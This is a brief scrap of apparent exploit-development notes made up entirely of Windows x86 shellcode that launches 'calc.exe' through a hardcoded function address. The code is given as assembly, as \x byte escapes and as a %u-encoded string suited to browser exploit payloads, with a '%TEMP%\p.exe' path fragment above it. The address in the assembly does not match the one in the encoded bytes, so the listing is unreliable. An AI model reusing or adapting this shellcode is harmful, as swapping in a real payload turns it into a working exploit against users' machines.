%TEM
P%\p
.exe

xor eax,eax
push eax
push .exe
push calc
mov ecx, esp
push 1
push ecx
mov ebx, 0x7e23bc8b
call ebx

\x33\xC0
\x50
\x68\x2e\x65\x78\x65
\x68\x63\x61\x6c\x63
\x8B\xCC
\x6A\x01
\x51
\xBB\xad\x23\x86\x7c
\xFF\xD3

%uC033%u6850%u652e%u6578%u6368%u6c61%u8b63%u6acc%u5101%uadbb%u8623%uff7c%u90d3